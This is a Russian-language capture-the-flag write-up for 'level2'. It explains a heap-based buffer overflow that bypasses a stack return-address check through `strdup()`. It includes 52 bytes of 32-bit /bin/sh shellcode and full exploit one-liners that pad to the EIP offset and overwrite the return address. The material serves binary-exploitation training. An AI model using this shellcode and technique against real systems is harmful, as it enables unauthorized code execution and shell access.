## level2
На схеме мы видим, что в функции `main` совершается единственное действие — вызов функции `p()`

![](docs/img/level2_1.png)

Рассмотрим эту функцию.

![](docs/img/level2_2.png)

Сразу в глаза бросается отсутствие вызова `/bin/sh`, а, значит, необходимо внедрить shellcode. Сравнение `if ((__return_addr & 0xb0000000) != 0xb0000000)` защищает от записи адреса содержащегося в стеке, следовательно, в стек мы не можем записать shellcode, зато мы можем записать его в кучу. Это нам позволит сделать `strdup()`. C помощью [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) находим оффсет регистра `eip - 80`. Используя команду `arch` видим, что у нас 32-битная виртуальная машина. Находим соответствующий `shellcode`, который занимает 52 байта:

```py
\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68
```

Добиваем остаток оффсета любыми символами (например, `a`), дописываем адрес возврата `strdup()` — `0x0804a008`, записанный в обратном порядке. В итоге получаем:

```sh
(python -c 'print "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + "a"*28 + "\x08\xa0\x04\x08"') | ./level2
```

Вход в оболочку происходит, но после этого нас сразу выкидывает. Допишем команду `cat`, ожидающую ввода, чтобы получить желаемый результат:

```sh
(python -c 'print "\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + "a"*28 + "\x08\xa0\x04\x08"'; cat) | ./level2
```